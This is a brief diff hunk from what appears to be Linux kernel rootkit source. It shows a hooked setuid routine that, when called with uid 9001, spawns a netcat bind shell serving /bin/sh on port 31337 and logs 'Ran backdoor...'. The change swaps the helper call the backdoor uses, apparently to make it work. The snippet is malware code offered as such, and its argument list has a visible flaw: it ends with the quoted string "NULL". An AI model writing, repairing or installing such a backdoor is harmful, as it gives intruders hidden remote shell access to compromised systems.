@@ -194,7 +194,7 @@ asmlinkage int hacked_setuid(uid_t uid){
 	if(uid == 9001){
 		char *argv[] = { "/bin/nc", "-lp", "31337", "-e", "/bin/sh", "NULL"};
 	    static char *env[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-	    call_usermodehelper_exec(argv[0], argv, env, UMH_WAIT_EXEC);
+	    call_usermodehelper(argv[0], argv, env, UMH_WAIT_EXEC);
 		printk("Ran backdoor...");
 	}
 	return (*orig_setuid)(uid);
